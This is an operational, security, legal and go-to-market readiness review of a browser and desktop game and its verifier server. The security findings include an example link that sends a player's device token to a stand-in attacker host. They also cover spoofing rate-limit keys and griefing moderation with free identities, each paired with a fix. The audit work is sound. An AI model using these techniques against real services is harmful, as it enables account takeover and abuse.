# Junkyard Draft — operational, security, legal and go-to-market readiness (read-only evaluation, 2026-10-29)

Scope: `C:\dev\junkyard draft` at commit 091a60d (package.json 0.7.0). Tracked files were read, not changed; the test suite was not run. Facts that could not be verified from the repo are marked **unverified**. Prices quoted from the project's own research (`docs/DOSSIER-v1.md`, `docs/PLAN-v1.md`) are marked "per DOSSIER/PLAN"; prices I add from general knowledge are marked "approx., unverified".

Priority: P0 = blocks a public beta · P1 = blocks 1.0 · P2 = should be done in the 1.x cadence · P3 = nice to have. Effort: S (hours), M (days), L (weeks).

Two facts the repo's own docs have wrong or stale, found while checking:
- `docs/STATUS.md:7` says a green `ci.yml` run on GitHub was "not verified"; the GitHub API (`/actions/runs`) shows the `ci` and `perf` runs for the 091a60d push at 2026-10-30T01:33:33Z both `completed / success`. The `v0.7.0` tag run (01:24:41Z) **failed**, so no desktop artifact exists for the tag.
- `server/README.md:51` says the Docker image "has **not been built yet**"; the `image` job in `.github/workflows/ci.yml:28-53` builds and smoke-tests it on every push (and the latest run passed).

---

## 1. Hosting and deployment — P0 overall, M

**What exists**
- Single-file verifier bundle (`npm run verifier:build` → `server/dist/verify.mjs`, 127 KB, zero runtime dependencies: `package.json` has no `dependencies` block).
- `Dockerfile:9-31`: multi-stage `node:24-alpine`, non-root `node` user, `VOLUME /data`, `HEALTHCHECK` on `/health`, `EXPOSE 4400`. Defaults baked in the image: `HOST=0.0.0.0 PORT=4400 DATA_DIR=/data RATE_LIMIT=60 CORS_ORIGIN=*` (`Dockerfile:23`). `TRUST_PROXY` is not set.
- Env/flags documented in `server/README.md:42-44` (HOST, PORT, DATA_DIR/BOARD_FILE, EVENTS_FILE, EVENTS_RETENTION_DAYS, CORS_ORIGIN, RATE_LIMIT, PLAYER_RATE_LIMIT, DAILY_SECRET, TRUST_PROXY, VERIFIER_LOG, DISCORD_WEBHOOK_URL, MODERATION_TOKEN, MODERATION_FILE); parsed in `server/verify.ts:1088-1116`.
- `VERIFIER_URL` is baked into the web build at build time (`scripts/esbuild-config.mjs:17`, `scripts/build.mjs:28`), default `http://127.0.0.1:4400`.
- CI (`ci.yml`): typecheck, full suite, web + verifier bundles; Docker image built, started on a named volume, smoke-tested (`tools/image-smoke.ts`, `tools/mint-check.ts`), restarted and re-checked; desktop job (tags/dispatch only) runs `desktop:pack` and uploads `release/win-unpacked` for 7 days (`ci.yml:68-72`).
- Hosting shape chosen on paper: Cloudflare Pages for the static game + one Hetzner CX23 behind Caddy (`docs/DOSSIER-v1.md:188`); ROADMAP ⚑ items 0.4.7/0.6.8/0.7.8 (`docs/ROADMAP.md:78,98,110`).
- Deploy/rollback of a rules bump is a written runbook (`server/README.md:100-106`) with an executable rehearsal (`tools/rehearse-rollback.ts`, last PASS in `docs/baselines/0.7/rollback-rehearsal-0.7.0.json`).

**What is missing** (each verified by absence in the repo)
| Gap | Evidence | Prio | Effort | Cost |
|---|---|---|---|---|
| No domain, no TLS termination. The verifier speaks plain HTTP; Caddy exists only as a sentence in DOSSIER §6. The client refuses to send the bearer to a non-https, non-loopback verifier (`game/src/render/identity.ts:40`), so without TLS no identity, groups or reports work. | `server/verify.ts:895` (http.createServer only) | P0 | S | domain approx. €10–15/yr (unverified); Caddy/Let's Encrypt €0 |
| No static host configured for the game (no Pages/Netlify config, no `_headers`, no CSP). | `game/index.html`, `dist/index.html` have no CSP; no `wrangler`/`_headers` files | P0 | S | Cloudflare Pages free tier (per DOSSIER) |
| Nothing is published by CI: no registry login/push for the image, no GitHub Release, no installer. `desktop:pack` builds `--dir` only; the NSIS target (`package.json:58-65`) is built by `desktop:dist`, which CI never runs. GitHub `/releases` is empty (API). | `ci.yml:39-42, 66-72` | P1 | S | GHCR free for public repos |
| No deploy automation (no `docker compose`, no systemd unit, no `deploy.yml`, no SSH action). Deploy = manual `docker run` on a VPS. | grep: no compose/systemd files | P1 | S/M | — |
| No staging environment; the only "staging" is CI's throwaway container. | — | P2 | S | second container on the same VPS, €0 |
| Blue/green or automated rollback: none. The rehearsal tool proves data compatibility, not a procedure on a live host. | `tools/rehearse-rollback.ts:28-33` (local spawn only) | P2 | S | — |
| `CORS_ORIGIN=*` default in the image; must be set to the game origin at deploy. | `Dockerfile:23`, `verify.ts:1095` | P0 | S | — |
| `TRUST_PROXY=1` must be set behind Caddy or every player shares one IP bucket (60 submissions/min total). See §4 for the XFF ordering bug. | `server/README.md:43`, `verify.ts:874-877` | P0 | S | — |
| Web build is environment-specific (VERIFIER_URL baked). Fine, but the runbook must say "build per environment"; `?verifier=` override must not stay as the escape hatch (§4). | `scripts/esbuild-config.mjs:17` | P0 (as part of §4) | S | — |

## 2. Reliability and capacity — P1 overall, M (SQLite L)

**Architecture facts**
- One Node process, one writer. Every accepted write re-serialises the whole hot board (`JSON.stringify(candidate, null, 1)`, pretty-printed) to a temp file and renames it (`verify.ts:361-373`). Writes are **synchronous** (`writeFileSync`/`renameSync`) on the event loop, so every commit blocks all requests for its duration.
- Each `POST /verify` re-simulates the replay **three times** on the request path: `verifyReplay` (`verify.ts:536`), `finalMachinesOf` and `roundsOf` (`verify.ts:550`). Bounded by the 4000-action cap (`server/README.md:111`) but unmeasured; PLAN-v5 0.8.7 moves it to a worker.
- Par worker: one job at a time, queue of 8, 20 s cap, 10-min backoff (`verify.ts:724-759`, `1120`). Today's seed jumps the queue (`verify.ts:883`).
- Hot/cold split: frozen days older than 30 move to `cold/YYYY-MM.json` with top-10 replays at startup and hourly (`server/cold.ts:14-15`, `verify.ts:313-333, 1118-1119`). Cold months load through a 3-entry LRU (`cold.ts:27`).
- Restart: loads `board.json` (damaged file → empty board, `verify.ts:762-786`), may commit once for tie-break backfill (`verify.ts:246-258`), splits cold, then serves. Dailies are minted lazily on first request, so no cron is needed at 00:00 UTC. **No graceful shutdown**: no SIGTERM/SIGINT handler anywhere in `server/verify.ts`; `docker stop` kills in-flight requests (atomic rename prevents file corruption; the Discord queue in `webhook.ts:67` is lost).
- `/health` (`verify.ts:909`) returns version, rulesVersion, protocol, entries, entriesAllVersions, cold counts, discord stats, uptime. It does **not** report hot-file size, last commit latency, par queue depth, disk free or rate-limiter cardinality, which are exactly the SQLite trigger inputs the runbook asks the operator to watch.
- No clustering, no queue, no cache layer; the rate limiter is per process (`server/README.md:110`).

**Measured capacity** (dev PC, Ryzen 9 9950X3D, Node 24, Windows; `docs/baselines/0.7/storage-split-365.json`, `-60.json`, `docs/baselines/0.6/storage*.json`). Trigger: 5 MB hot file or 50 ms commit.

| Scenario | Whole board | After split: hot file / commit | Verdict |
|---|---|---|---|
| 10 players × 365 d | 3.15 MB / 11.7 ms | 0.41 MB / 1.3 ms | fine |
| 100 × 365 d | 30.2 MB / 118 ms | 3.96 MB / 9.8 ms | fine |
| 100 × 60 d | 4.97 MB / 18 ms | 3.96 MB / 9.8 ms | fine |
| 1,000 × 60 d | 21.7 MB / 61 ms | 13.75 MB / 28.9 ms | **hot size over** |
| 1,000 × 365 d | 131 MB / 448 ms | 13.75 MB / 35.6 ms | **hot size over** |
| 10,000 × 60 d | 23.3 MB / 64 ms | 15.5 MB / 34.6 ms | **hot size over**; entries capped at 1,000/seed |

Interpretation per tier (my extrapolation from these numbers; the VPS itself is unmeasured):
- **1k daily players**: hot file ≈ 14 MB, ~30–36 ms per commit on a 9950X3D. A 2-vCPU Hetzner CX23 is plausibly 2–4× slower (**unverified**), i.e. 70–140 ms of event-loop blocking per accepted submission. At 1,000 players × up to 2 submissions/min (`PLAYER_RATE_LIMIT`) the write path alone can saturate the loop. SQLite (PLAN-v4 0.7.0b) is the documented, scheduled answer at ~500 daily players (`server/README.md:78`).
- **10k daily players**: beyond the JSON design. Also a *product* limit: `DEFAULT_MAX_ENTRIES_PER_SEED = 1000` (`verify.ts:143`) means 9,000 of 10,000 players verify a run and then drop off the board on the next prune (`verify.ts:341-344`). The policy page states the cap (`docs/POLICY.md:21`) but the UX consequence ("your verified run is gone") is not designed for.
- **100k daily players**: not viable on this architecture (single process, synchronous full-file writes, inline re-simulation). Needs SQLite/Postgres, async writes, a worker pool for verification, and multiple instances behind a shared store. Not a beta concern.

**Unbounded growth (correctness findings)**
- `dailies` is never pruned and any past date can be minted by an unauthenticated `GET /daily?date=YYYY-MM-DD` (`verify.ts:642-651`: `isUtcDate(date) && date <= today`), each mint committing the whole board; `GET /weekly?week=` likewise (`verify.ts:291-300`, `isWeekId` has no lower bound, `game/src/sim/weekly.ts:36`). An attacker can create tens of thousands of records and thousands of cold month files with GETs. — P1, S (bound dates to ≥ the service's first issued day, rate-limit GETs per IP).
- `players` is never capped and `POST /identity` has only a per-player bucket (`verify.ts:961`); device tokens are free to generate, so the map and the file grow without limit, one full commit per claim. — P1, S (per-IP limiter on identity/groups/report POSTs; a cap with LRU on never-submitting identities).
- `events.jsonl` has time retention (30 d) but no size cap; 30 req/min/IP × 100 events (`verify.ts:1061-1075`, `events.ts:44`). — P2.

## 3. Backups and disaster recovery — P0, S

- **No backup exists in code or CI.** The only mentions are "back it up" for the secret (`server/README.md:42`) and a one-line rsync idea (`docs/DOSSIER-v1.md:188`). No restore drill; `tools/rehearse-rollback.ts` rehearses a *deploy*, not a *restore*.
- Data-directory layout (from `verify.ts:1093-1114`, `cold.ts`): `board.json` (hot), `daily-secret` (mode 0600, generated when `DAILY_SECRET` is unset, `verify.ts:1107`), `events.jsonl`, `moderation.jsonl`, `cold/YYYY-MM.json`, `cold/index.json`, transient `.board-*.tmp`. One Docker named volume.
- **`DAILY_SECRET` loss**: issued days keep their stored seeds and still accept submissions; the next unissued day mints under the new secret, so the published commitment of the last old day will not match (`server/README.md:42`; rehearsed at `tools/rehearse-rollback.ts:76-84`). The chain breaks once and must be announced. **`DAILY_SECRET` leak** is worse: whoever holds it computes every future seed (`server/mint.ts:26-30`) and can pre-play tomorrow, silently defeating the promise in `docs/POLICY.md:26`; there is no detection. The secret is also visible in `docker inspect`/`ps` when passed by env or `--daily-secret`.
- Retention policy (stated): entries ≤ 1,000/seed, replays top-100 hot / top-10 cold, ≤ 5,000 seeds, events 30 d, cold **forever** (no deletion path for cold months), `moderation.jsonl` append-only forever.
- Deletion gap affecting DR and GDPR: `deletePlayer` (`verify.ts:449-459`) removes hot replays only; a deleted player's replays kept in cold storage remain on disk and are still served by `GET /replay` under the label `deleted` (`verify.ts:575-581` resolves cold replays, `coldEntries` relabels at `verify.ts:273`). `docs/POLICY.md:45` promises "drops their replays".

Minimum: nightly `tar` of `DATA_DIR` to an off-box location (Hetzner Storage Box approx. €3–4/mo or Backblaze B2 cents/GB — both **unverified**), the secret stored separately offline (password manager), a quarterly restore drill scripted like `rehearse-rollback.ts`, and `moderation.jsonl`/cold included.

## 4. Security — P0 items present, S–M

**Good, verified**
- Bearer = 32 hex; hashed before any use; never stored or logged (`verify.ts:92-98`; test `tests/verifier.test.ts:611-642` asserts no log line contains the token).
- Moderation token: `timingSafeEqual` with length pre-check (`verify.ts:1018-1019`); 403 when unset.
- Body caps: 512 KB `/verify` (`verify.ts:146`), 4 KB identity/groups/report/moderation, 64 KB events (`verify.ts:890`); query limits clamped (`clampInt`, `verify.ts:156-161`); seeds/hashes sliced to 64 chars; JSON parse and handler exceptions guarded (`verify.ts:904, 1079`); socket-level garbage → 400 (`verify.ts:1082`).
- Every user-written field through one filter with a call-site-counting test (`verify.ts:140`, `game/src/identity/identity.ts:36-43`).
- Group codes 40-bit, one refusal for unknown/non-member (`verify.ts:379, 919-924`).
- Electron: `contextIsolation`, `sandbox`, `nodeIntegration:false` (`desktop/main.cjs:30`), navigation locked to `file://` (`main.cjs:36`), external links denied/opened in the OS browser (`main.cjs:35`), IPC sender- and payload-checked (`main.cjs:12-23`), preload exposes two functions (`desktop/preload.cjs`).
- Zero runtime dependencies in the verifier and the game bundle; Phaser licence text present in `dist/main.js`.

**Findings**
| # | Finding | Evidence | Prio | Effort |
|---|---|---|---|---|
| S1 | **Device-token exfiltration via `?verifier=`.** Every scene resolves the verifier as `URLSearchParams(location.search).get('verifier') || import.meta.env.VERIFIER_URL` in production builds too; `bearerAllowed` accepts any `https://` origin, and `fetchClaimed` runs on title load with the bearer. A link `https://<game>/?verifier=https://attacker.example` therefore sends the victim's device token (the only secret; "anyone with it can play as you", `docs/POLICY.md:44`) to the attacker, and `challengeLink` propagates the parameter (`challenge.ts:11-12`). This is what a bug bounty finds first. | `BootScene.ts:23`, `GameScene.ts:53`, `ResultsScreen.ts:32`, `TitleScreen.ts:33`, `main.ts:43`, `identity.ts:40-44`; `server/README.md:55` documents the override | **P0** | S (honour `?verifier=` only when `import.meta.env.DEV` or on loopback origins) |
| S2 | **No Content-Security-Policy** on the web page or the Electron window, while the token sits in `localStorage` (`identity.ts:9`): any XSS = account takeover. PLAN-v5 0.8.10 refers to "the web's strict CSP" that does not exist. | `game/index.html`, `dist/index.html`, `desktop/main.cjs` | P0 | S (meta CSP: `default-src 'self'; connect-src 'self' https://verifier.<domain>; img-src 'self' data: blob:`) |
| S3 | **Per-IP limiting covers only `/verify` and `/events`.** `POST /identity`, `/groups*`, `/report` have per-player buckets only; identities are free, so one client has unlimited write rate and unlimited storage growth (§2). GETs are unlimited (mint-by-date, par requests). | `verify.ts:880-888, 961, 979, 1003` | P1 | S |
| S4 | **`X-Forwarded-For` parsing takes the first (client-supplied) hop.** With `TRUST_PROXY=1` behind Caddy, a client that sends its own XFF header gets a spoofable rate-limit key; the trusted value is the rightmost entry appended by the proxy (or use Caddy's `X-Real-IP`). If the container port is also reachable directly, the limiter is bypassable entirely. | `verify.ts:875` | P0 (set-up time) | S |
| S5 | **Report-to-hide griefing.** The first report hides a name instantly (`verify.ts:484`); reporters only need a claimed name, which costs nothing; so one person with fresh tokens can hide every name on every board. The DOSSIER's "hidden-pending state expires after 72 h" (`docs/DOSSIER-v1.md:162`) is not implemented (no expiry in `verify.ts`). | `verify.ts:475-488` | **P0** for a public board | S/M (require ≥ 2 distinct reporters who each hold a verified entry ≥ N days old, or auto-expire after 72 h, or hide only on moderator action) |
| S6 | **Raw IPs and secrets-adjacent data in the request log.** Each line is `ts ip method url status ms` (`verify.ts:901`): raw client IP (personal data under GDPR, contradicting "It stores no addresses" in `docs/POLICY.md:49` for logs), and the full query string, which carries `?group=<code>` — the only membership secret of a group — on every scoped read. No rotation (Docker `json-file` default is unbounded). | `verify.ts:898-902` | P0 | S (hash or truncate IP, strip `group=`, `--log-opt max-size`) |
| S7 | **Internal errors are swallowed without logging**: `guarded()` and the route catch answer 500 but drop the exception. Operators cannot see what failed. | `verify.ts:904, 1079` | P1 | S |
| S8 | `CORS_ORIGIN=*` default (image and code). Harmless for GETs, but should be the game origin to limit third-party board scraping and token-bearing POSTs from other sites. | `Dockerfile:23`, `verify.ts:1095` | P0 (deploy) | S |
| S9 | Re-simulation inline on the request path (×3). A 4,000-action replay is bounded but its cost is unmeasured; CPU exhaustion via many valid long replays is limited only by 60/min/IP. | `verify.ts:536, 550` | P1 | M (PLAN-v5 0.8.7) |
| S10 | No security response headers (`X-Content-Type-Options`, `Referrer-Policy`, HSTS belongs at Caddy). | `verify.ts:900` | P2 | S |
| S11 | Node HTTP timeouts left at defaults (headersTimeout 60 s, requestTimeout 300 s); body length measured in JS string length, not bytes (`body.length > MAX_BODY`), so multi-byte bodies can reach ~1.5 MB. | `verify.ts:1043` | P2 | S |
| S12 | Secrets via CLI flags (`--daily-secret`, `--moderation-token`) appear in `ps`. Prefer env or files. | `verify.ts:1105, 1113` | P2 | S |
| S13 | `GET /funnel` is public: aggregate analytics for anyone. | `verify.ts:1060` | P2 | S |
| S14 | Webhook abuse: a new #1 posts once per leading replay hash; two cooperating identities can flip the lead up to the 2/min/player cap, ~60 Discord posts/min; Discord 429 is honoured and the queue is serial, so the channel is spammed rather than the server. | `webhook.ts:36`, `verify.ts:567` | P2 | S (per-seed cooldown on `lead`) |
| S15 | No dependency hygiene automation: no Dependabot/Renovate, no `npm audit` in CI, no `SECURITY.md`. Electron is `^45.0.0`; majors ship every 8 weeks and only the last 3 are supported, so a quarterly bump is required for Chromium CVEs. | `.github/` contains workflows only; `package.json:32` | P1 | S |
| S16 | Group-code enumeration: 2^40 codes with 5 joins/min/player; infeasible even with free identities. OK. Duplicate-replay rejection is global (`verify.ts:539`): a known replay hash can be "burned" by the first submitter — by design, but note that two players with identical action lists cannot both score (anti-cheat trade-off noted in PLAN-v1 0.9.2). | — | P3 | — |

## 5. Observability and operations — P1, S/M

- **Logs**: one unstructured line per request to stdout (`verify.ts:901`); a few `console.log/error` lines for startup, cold split, audit failures and Discord drops. No request ids, no JSON, no levels, no rotation, `VERIFIER_LOG=0` turns requests off.
- **Metrics**: none. `/health` counters only (§2). No histogram of commit latency although the runbook's SQLite trigger is defined in those terms (`server/README.md:57`).
- **Uptime monitoring / alerting**: none configured; nothing in the repo points at a monitor. Free tiers (UptimeRobot, Better Stack, Cloudflare health checks) cover `/health` at €0 (**unverified** current free-tier limits).
- **Error tracking**: none, client or server. Client errors are deliberately not sent anywhere (privacy); the dev API and e2e cover them in CI only.
- **Audit**: `moderation.jsonl` append-only, one JSON line per report/action (`verify.ts:527-530`); a failed append is logged and never undoes the action. Not rotated, not backed up (§3).
- **Runbooks present** (`server/README.md`): run/Docker (46-55), env vars (42-44), rules-version deploy and rollback with rehearsal (100-106), secret rotation consequences (42), storage trigger and decision (57-80), guarantees (85-98).
- **Runbook gaps**: incident response (what to do when `/health` fails at 00:00 UTC; the client falls back to the labelled practice seed, `docs/POLICY.md:28`, so the failure mode is graceful but unannounced); **void-day procedure** (promised by PLAN-v1 and scheduled as PLAN-v5 0.8.7 `tools/void-day.ts`; today a compromised day cannot be voided); restore-from-backup; secret compromise (rotate + announce the chain break); DSAR/deletion handling; moderation SLA (PLAN-v1 1.0.5 wants 72 h); Electron/Node patch cadence; "a day whose outcomes a bug compromised is voided, never re-scored" line (PLAN-v5 0.8.7) not yet in the README.
- **On-call reality**: one person, two scheduled hot moments (daily open 00:00 UTC, weekly open Friday 18:00 UTC), both lazily minted so no cron can fail; the realistic promise is "best effort, status in Discord", stated in the terms.

## 6. Privacy and legal — P0 (notice, deletion UI, licence) / P1

**Personal data actually processed** (code, not policy): display name (free text ≤ 32 chars; may contain real names — a `personal-info` report reason exists, `identity.ts`), `player_id` (SHA-256 of a device token: a pseudonymous identifier), verified replays (behavioural data; hot top-100, cold top-10, forever), scores and `verifiedAt` timestamps, group memberships, reports (reporter id, reason, time: `verify.ts:136`), **raw IP addresses in stdout logs** (`verify.ts:901`), a daily-salted IP hash in `events.jsonl` kept **30 days** (`verify.ts:793-801`; PLAN-v3 §1 and DOSSIER §5.1 say **7 days** — inconsistency to resolve one way or the other), opt-in funnel events keyed by a random install id, and **Discord** as a recipient of player labels and scores when the webhook is on (`webhook.ts:25`; DOSSIER §6 "no third parties" becomes false the day the webhook is enabled).

**GDPR / UK GDPR**
| Obligation | Status | Prio |
|---|---|---|
| Privacy notice (controller, contact, purposes, lawful bases, retention, recipients, rights, complaint route) | Absent. `docs/POLICY.md` §"Identity and your data" is a good factual base but names no controller and no lawful basis. PLAN-v1 0.9.5 ⚑ assigns the text to the owner. | **P0**, S |
| Right to erasure | Server-side `DELETE /me` exists (`verify.ts:996-1000`); **no client UI calls it** (no `method: 'DELETE'` anywhere in `game/src`), so a normal player cannot exercise it; cold replays survive deletion (§3). | **P0**, S |
| Right of access (DSAR) | No export path; `GET /identity` + public boards give a partial picture; replays by hash. A `GET /me/export` is cheap. | P1, S |
| Records of processing / retention schedule | Partially in POLICY.md; logs and Discord missing. | P1, S |
| Lawful basis | Legitimate interest for verification/anti-abuse; consent for telemetry (explicit, `events.ts:78`). Needs writing down. | P1, S |
| Cookies / ePrivacy | No cookies; `localStorage` used for functionality only (settings, save, identity) → exempt from consent banners. | OK |
| International transfer | Hetzner (EU) fine; Discord (US) → list as recipient. | P1 |
| Children (COPPA / UK AADC) | Not child-directed; no accounts, no chat, no email, no purchases on the web build (DOSSIER §6 reasoning). Public free-text names are the one exposure: a minor can publish their real name. Mitigation: wording at the name prompt ("not your real name") and the existing `personal-info` report reason. Not legal advice; a short written assessment is enough. | P2, S |

**Terms of service**: none. Needed before a public board: name rules, moderation and voiding powers, no warranty/uptime promise, governing law, the "verified" claim scope.

**Licences of what ships**: Phaser MIT (notice present in `dist/main.js`), Electron MIT with Chromium/Node notices bundled by electron-builder; fonts are the system stack (no `@font-face`, no bundled font files); SFX synthesised by `tools/make-sfx.ts`; art SVGs are exports of the game's own procedural textures (`tools/export-svg.ts:1-5`). No third-party asset licence obligations found beyond MIT notices.

**The repo's own licence**: the GitHub repo is **public** (API: `visibility: public`, `license: null`), has **no `LICENSE` file and no root `README.md`** (only developer-facing `server/README.md` and `desktop/README.md`), `package.json` is `"private": true`, the copyright line is `"Copyright © 2026"` with **no holder** (`package.json:44`) and `author: "Jon"`. Default law = all rights reserved, but a public repo without a licence invites forks that are technically infringing and leaves contributors' rights undefined. Decision needed (P0, S): either (a) keep proprietary and say so (`LICENSE` = "All rights reserved; source published for verification/transparency", full name in the copyright line, a root README that says what the game is and what the source may be used for), or (b) open the engine/sim (MIT/Apache-2.0) and keep name, art and store assets proprietary. Given the design's reliance on server re-simulation, open source does not weaken anti-cheat.

**Trademark**: `docs/DOSSIER-v1.md:186` records RDAP checks on 2026-10-29 (`junkyarddraft.com/.io`, `playjunkyard.com`, `scrapdraft.com` free; `.gg` unchecked) and recommends a USPTO/EUIPO + Steam/itch search; nothing registered, no search done. **Unverified** here. P1, S (search), registration optional (EUIPO one class approx. €850, **unverified**).

## 7. Moderation and community operations — P1, S/M

- Report flow: in-client from the replay banner, five fixed reasons, no free text, instant hide, `duplicate: true` per reporter, 50 reporters kept per target, two-clears immunity (`verify.ts:133, 475-488`; STATUS session 42). Visible to the reported player via `GET /identity hidden: true` (`verify.ts:958`).
- Tooling: `tools/moderate.ts list|clear|rename|rename-group` over HTTP with `MODERATION_TOKEN`; audit in `moderation.jsonl`. No admin UI (CLI only), no bulk actions, no "ban" (by design), no report path for **group names** by players (only a moderator can force-rename a group, `verify.ts:517-525`), no report for anonymous entries (422 by design).
- **Appeal contact is a placeholder** `moderation@example.invalid` (`verify.ts:135`) baked into `docs/POLICY.md:47` and `game/public/policy.json`; replace and run `npm run policy` (P0, S).
- Blocklist: 9 folded substrings (`identity.ts:36`) including staff-impersonation words; no reserved developer name/handle; no confusable-script handling beyond leetspeak folding (PLAN-v1 0.9.3 wants confusables).
- Single moderator (the owner), no SLA, no second pair of hands, no 72-h auto-expiry (§4 S5).
- Community: no Discord server created (PLAN-v1:203 designs the channels), no community guidelines / code of conduct, no `#bugs` path, no issue template in the public repo.

## 8. Distribution — P1, M

- **Windows**: NSIS installer, per-user, **unsigned** (`desktop/README.md`: SmartScreen will warn; "Nobody has run the installer yet"); CI builds only the unpacked dir on tags and the tag run failed; no GitHub Release; no auto-update (the plan relies on Steam's updater for that channel, `docs/PLAN-v1.md` 1.0.1). Signing options per PLAN-v1 1.0.1: Azure Trusted Signing ≈ $9.99/mo (US/Canada individuals) or OV cert $150–300/yr.
- **macOS/Linux**: electron-builder config present (`package.json:67-74`), never run; notarisation needs the $99/yr Apple program (per PLAN-v1); Linux AppImage scheduled PLAN-v5 0.8.8.
- **Electron 45.0.0** locked in `package-lock.json`; needs a bump every major (≈ 8 weeks) for Chromium security fixes — no process exists (S15).
- **Steam**: not started. Needs Steamworks account + $100 Direct fee (recoupable after $1,000, per DOSSIER §6), `steamworks.js` behind a build flag, ticket binding in the verifier (PLAN-v5 0.8.10 ⚑), store assets, Deck verification (PLAN-v5 0.8.1/0.8.3 prerequisites).
- **itch.io**: planned as the web mirror (PLAN-v1:203); nothing set up. itch allows HTTPS calls to the verifier (per PLAN-v1).
- **PWA**: no `manifest.json`, no service worker (`game/public` holds `art/`, `policy.json`, `sfx/` only) → not installable, no offline cache; the "local path works without a server" promise holds only while the page is loaded.
- **Browser matrix**: Chromium only in CI (`ci.yml:23`); Firefox/WebKit determinism unproven until PLAN-v5 0.8.0. Bundle `dist/main.js` 1,416,768 B (390 KiB gzip per STATUS:5).

## 9. Analytics and product measurement — P2, S

- **Exists**: opt-in, fixed 25-event vocabulary (`game/src/telemetry/events.ts:8-34`), explicit consent flag, 100-event batches, 30-day retention, daily-salted IP hash; `GET /funnel` (public) and `tools/funnel.ts` (`npm run funnel`) print the first-session funnel, tutorial step reach, rejection reasons, completed modes, submission results, shares, tips, settings, session length.
- **Measurable today**: first-session funnel among *consenting* installs against the targets in `docs/PLAN-v1.md:239` (≥ 80 % `first_run_complete/app_start`, ≥ 70 % tutorial completion, ≥ 50 % second game, etc.); server-side facts from `board.json`: verified runs per day, distinct `playerId`s per day, claimed names, groups, medal thresholds, archive history (the richest telemetry, as PLAN-v1:235 says).
- **Not measurable today**: DAU/MAU of non-consenting players (nothing is counted server-side except the request log), consent rate (non-consenting installs are invisible), D1/D7/D28 retention (computable for consenting installs from `events.jsonl` install ids but `funnel.ts` does not compute it, and 30-day retention of rows caps D28), rejected-submission counts and late submissions (answered, never counted: `verify.ts:548`), web traffic (needs Cloudflare analytics — cookieless, free), wishlists/conversion (Steam). No dashboard, no time series: once rows are pruned the history is gone unless the operator snapshots reports (suggest a weekly `funnel` JSON committed under `docs/metrics/`).

## 10. Marketing and store readiness — P1 for 1.0, P2 for beta, M

Nothing exists: no website (the game URL will be the site), no trailer (clip export to GIF/WebM exists and is the intended source), no press kit, no store page, no screenshot set (Control Room screenshots are dev artefacts at dev resolutions), logo = `desktop/build/icon.svg` only, no social accounts, no mailing list (and PLAN says no email collection), no Discord.

Minimal launch kit (web beta): domain + one-page site on Cloudflare Pages (free) with "play", the daily, the policy and privacy pages; 6–8 captures at 1920×1080 and 1280×800; a 30–60 s trailer cut from exported clips with free tooling; a presskit-style page (free); itch page (free); Discord server (free); one social handle. For 1.0: Steam page ($100), capsule art (the one item a solo dev usually buys: approx. $200–800 for a capsule set, **unverified**), demo build (tutorial + daily, local best only, PLAN-v1 0.9.6), Next Fest submission ≥ 5 weeks ahead.

## 11. Monetisation readiness — P2 (post-beta), M–L

Nothing implemented: no payments, entitlements, receipts, or supporter flags in `Board`/`Player`. Constraints from `docs/PLAN-v1.md:209-213`: no pay-to-win, premium currency, loot, variable cosmetics, paid streak repair; nothing earned may touch offers/weights/costs; same seed for everyone. Compatible options and what each needs:

| Option | Fit | Technical needs | Payments/VAT |
|---|---|---|---|
| Premium Steam build ($9.99–14.99, PLAN-v1 1.0.2) | Best fit; web stays free as the growth loop | Steamworks ($100), `steamworks.js` behind a build flag, ticket → `player_id` binding, trusted-write board (PLAN-v5 0.8.10) | Steam is merchant of record: VAT, refunds, receipts handled |
| itch.io pay-what-you-want / donate on the web mirror | Zero code | itch page; verifier CORS for the itch origin | itch handles checkout; confirm its current VAT handling (**unverified**) |
| Donations (Ko-fi/GitHub Sponsors) | Zero code; public repo already | A link | Provider handles |
| Cosmetics earned by participation (medals, streak, group badges) | Already exist; must never be sold | — | — |
| Supporter tier with no gameplay effect (badge/colour next to the label) | Allowed by the rules | Entitlement proof bound to `player_id`: Steam DLC ownership via ticket, or an itch/Stripe-issued key redeemed at a new `POST /supporter` (protocol 3, additive); a `supporter` flag in `Player`, rendered by clients | Use Steam/itch as merchant; avoid self-hosted card handling (PCI, EU OSS VAT) |

Do not: ads (privacy stance, portal restrictions), accounts/email for payments on the web (DOSSIER §6 "no email collection").

## 12. Support and cost — P1, S

**Monthly running cost**
| Item | Beta (≤ 100 daily players) | 10k DAU | Source |
|---|---|---|---|
| VPS for the verifier | Hetzner CX23 €3.99 | CX33/CPX31-class €7–15 (approx., **unverified**) + SQLite migration (dev time) | DOSSIER §6 / estimate |
| Static hosting (Cloudflare Pages) | €0 | €0 (unmetered) | DOSSIER §6 |
| Domain | ≈ €1/mo | ≈ €1/mo | approx., unverified |
| Off-site backups | ≈ €3–4 (Storage Box / B2) | ≈ €3–4 | approx., unverified |
| Uptime monitor, Discord, GHCR | €0 | €0 | free tiers, unverified |
| Code signing (from 1.0) | — | ≈ $9.99/mo Azure Trusted Signing | PLAN-v1 1.0.1 |
| **Total** | **≈ €8–10/mo** | **≈ €25–40/mo** | |

One-off: Steam Direct $100 (recoupable), Apple Developer $99/yr if macOS, OV certificate $150–300/yr as the alternative to Azure signing, trademark search €0 / EUIPO filing approx. €850 (unverified), capsule art approx. $200–800 (unverified).

**Support channels**: none today. Plan: Discord `#bugs-and-feedback`, a real appeal/privacy email alias on the domain, GitHub Issues (repo is public). **Operator time**: beta ≈ 2–4 h/week (moderation queue via `moderate.ts list`, `/health` glance, weekly funnel snapshot, backup check, Electron/Node patch check); launch weeks 10+ h/week; one-person on-call is not realistic → "best effort" in the terms, and the practice-seed fallback as the graceful degradation.

---

## (a) P0 — cannot open a public beta without
1. **Kill the production `?verifier=` override** (S1): honour it only in dev builds or for loopback origins; remove it from `challengeLink`. S.
2. **Domain + TLS + reverse proxy** (Caddy), `CORS_ORIGIN=<game origin>`, `TRUST_PROXY=1` with the XFF fix (S4), container port bound to localhost only. S.
3. **CSP** on `index.html` (and the Electron window) with `connect-src` limited to the verifier origin (S2). S.
4. **`DAILY_SECRET` provisioned out of band and stored offline; nightly off-box backup of `DATA_DIR` including `cold/` and `moderation.jsonl`; one scripted restore drill**. S.
5. **Privacy notice + terms** with a real controller contact; replace `APPEAL_CONTACT` and regenerate the policy; reconcile the 7-vs-30-day IP-hash statement; list Discord as a recipient. S (owner writes).
6. **Deletion that works for players**: a "delete my data" button calling `DELETE /me`, and cold-replay removal on deletion. S.
7. **Report-to-hide hardening** (S5): hide only after ≥ 2 distinct established reporters, or 72-h auto-unhide, or moderator-only hide. S/M.
